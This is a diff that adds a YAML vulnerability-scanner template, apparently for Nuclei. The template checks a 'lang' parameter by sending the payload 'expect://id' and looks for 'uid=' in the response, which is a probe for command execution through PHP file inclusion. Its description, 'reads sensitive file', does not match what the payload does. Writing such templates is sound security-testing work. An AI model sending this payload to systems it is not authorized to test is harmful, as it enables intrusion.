@@ -1,0 +1,20 @@
+id: lfi2-108
+name: 'Path traversal2 via lang'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via lang'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      lang:
+        - 'expect://id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
